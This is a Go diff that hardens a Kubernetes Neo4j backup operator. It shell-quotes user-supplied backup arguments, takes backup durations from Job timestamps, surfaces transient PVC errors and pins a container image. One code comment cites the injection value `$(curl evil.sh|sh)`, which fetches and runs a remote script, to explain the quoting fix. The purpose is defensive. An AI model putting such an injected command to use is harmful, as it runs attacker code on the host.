@@ -22,6 +22,7 @@ import (
 	"os"
 	"sort"
 	"strconv"
+	"strings"
 	"time"
 
 	batchv1 "k8s.io/api/batch/v1"
@@ -362,7 +363,6 @@ func (r *Neo4jBackupReconciler) handleOneTimeBackup(ctx context.Context, backup 
 }
 
 func (r *Neo4jBackupReconciler) handleExistingBackupJob(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, job *batchv1.Job) (ctrl.Result, error) {
-	backupStart := time.Now()
 	backupM := metrics.NewBackupMetrics(backup.Name, backup.Namespace)
 
 	// Check job status
@@ -370,7 +370,7 @@ func (r *Neo4jBackupReconciler) handleExistingBackupJob(ctx context.Context, bac
 		// Backup completed successfully
 		r.updateBackupStatus(ctx, backup, "Completed", "Backup completed successfully")
 		r.Recorder.Event(backup, corev1.EventTypeNormal, EventReasonBackupCompleted, "Backup completed successfully")
-		backupM.RecordBackup(ctx, true, time.Since(backupStart), 0)
+		backupM.RecordBackup(ctx, true, jobDuration(job), 0)
 
 		// Update backup statistics
 		r.updateBackupStats(ctx, backup, job)
@@ -382,13 +382,50 @@ func (r *Neo4jBackupReconciler) handleExistingBackupJob(ctx context.Context, bac
 		// Backup failed
 		r.updateBackupStatus(ctx, backup, "Failed", "Backup job failed")
 		r.Recorder.Event(backup, corev1.EventTypeWarning, EventReasonBackupFailed, "Backup job failed")
-		backupM.RecordBackup(ctx, false, time.Since(backupStart), 0)
+		backupM.RecordBackup(ctx, false, jobDuration(job), 0)
 		return ctrl.Result{}, nil
 	}
 
 	// Job is still running
 	r.updateBackupStatus(ctx, backup, "Running", "Backup job is running")
 	return ctrl.Result{RequeueAfter: r.RequeueAfter}, nil
+}
+
+// shellQuote single-quotes a string for safe inclusion in a /bin/sh -c
+// command. Single quotes disable every shell metacharacter except the
+// single quote itself, so `'foo'` is literal `foo` even if the string
+// contains $, `, ;, &, |, *, etc.
+//
+// Embedded single quotes are handled with the classic Bourne idiom:
+// close the quoted run, emit an escaped quote, reopen — `'\”`.
+//
+// Used for backup.Spec.Options.AdditionalArgs (issue #117-adjacent
+// hardening): values flow directly into a /bin/sh -c command, so an
+// argument like `$(curl evil.sh|sh)` would otherwise be executed by
+// the shell. strconv.Quote is NOT a substitute — it emits Go-syntax
+// double-quoted strings, which still allow shell variable expansion.
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+// jobDuration reports how long the backup Job ran for. Both metrics
+// (RecordBackup) and history (BackupStats.Duration) need this; deriving from
+// time.Now() at reconcile entry is wrong because the reconcile that observes
+// Succeeded/Failed runs some time after the Job actually finished, so the
+// elapsed wall-clock is just the reconcile cost (issue #117-adjacent: a
+// completed Job's "duration" metric was reporting milliseconds).
+//
+// Falls back to time.Since(StartTime) when CompletionTime is missing — covers
+// the rare case where a Job is observed Failed mid-run before its
+// CompletionTime is written. Returns 0 if StartTime is also missing.
+func jobDuration(job *batchv1.Job) time.Duration {
+	if job == nil || job.Status.StartTime == nil {
+		return 0
+	}
+	if job.Status.CompletionTime != nil {
+		return job.Status.CompletionTime.Sub(job.Status.StartTime.Time)
+	}
+	return time.Since(job.Status.StartTime.Time)
 }
 
 // backupTargetName resolves the Neo4j instance name from a backup spec.
@@ -423,6 +460,11 @@ func (r *Neo4jBackupReconciler) ensureTempStagingPVC(ctx context.Context, backup
 	pvc := &corev1.PersistentVolumeClaim{}
 	if err := r.Get(ctx, types.NamespacedName{Name: pvcName, Namespace: backup.Namespace}, pvc); err == nil {
 		return nil // PVC already exists
+	} else if !errors.IsNotFound(err) {
+		// Transient API errors mustn't fall through to Create — that would
+		// cause spurious AlreadyExists / repeated transient failures. Bubble
+		// up so the caller's RetryOnConflict / RequeueAfter handles it.
+		return fmt.Errorf("failed to get temp staging PVC %s/%s: %w", backup.Namespace, pvcName, err)
 	}
 
 	pvc = &corev1.PersistentVolumeClaim{
@@ -662,7 +704,7 @@ func (r *Neo4jBackupReconciler) buildBackupCommand(ctx context.Context, backup *
 			cmd += " --include-metadata=" + backup.Spec.Options.IncludeMetadata
 		}
 		for _, arg := range backup.Spec.Options.AdditionalArgs {
-			cmd += " " + arg
+			cmd += " " + shellQuote(arg)
 		}
 	}
 
@@ -966,8 +1008,12 @@ func (r *Neo4jBackupReconciler) cleanupBackupArtifacts(ctx context.Context, back
 					RestartPolicy: corev1.RestartPolicyNever,
 					Containers: []corev1.Container{
 						{
-							Name:    "backup-cleanup",
-							Image:   "alpine:latest",
+							Name: "backup-cleanup",
+							// Pinned tag (not :latest) for reproducible
+							// rebuilds — :latest resolves to a different
+							// digest over time and can silently change pod
+							// behaviour across operator reconciles.
+							Image:   "alpine:3.20",
 							Command: []string{"/bin/sh"},
 							Args:    []string{"-c", script},
 							VolumeMounts: []corev1.VolumeMount{
@@ -1101,7 +1147,6 @@ func (r *Neo4jBackupReconciler) updateBackupStats(ctx context.Context, backup *n
 		if err := r.Get(ctx, client.ObjectKeyFromObject(backup), latest); err != nil {
 			return err
 		}
-		latest.Status.Stats = stats
 
 		run := neo4jv1beta1.BackupRun{
 			RunID:  string(job.UID),
@@ -1117,11 +1162,17 @@ func (r *Neo4jBackupReconciler) updateBackupStats(ctx context.Context, backup *n
 		// already prevents repeat calls for the same Job, but record the
 		// invariant explicitly here so future callers can't reintroduce
 		// duplicates. The Job UID is the cheapest stable key — every retry
-		// produces a new Job with a new UID.
+		// produces a new Job with a new UID. Returning nil (instead of an
+		// idempotent Status.Update) saves the round-trip and the
+		// resourceVersion bump on every redundant reconcile.
 		if backupRunAlreadyRecorded(latest.Status.History, run) {
-			return r.Status().Update(ctx, latest)
+			return nil
 		}
 
+		// Update Stats and append History together — only writing Stats when
+		// we're also appending the run keeps the two in sync (Stats reflects
+		// the most recent recorded run).
+		latest.Status.Stats = stats
 		latest.Status.History = append([]neo4jv1beta1.BackupRun{run}, latest.Status.History...)
 		if len(latest.Status.History) > 10 {
 			latest.Status.History = latest.Status.History[:10]
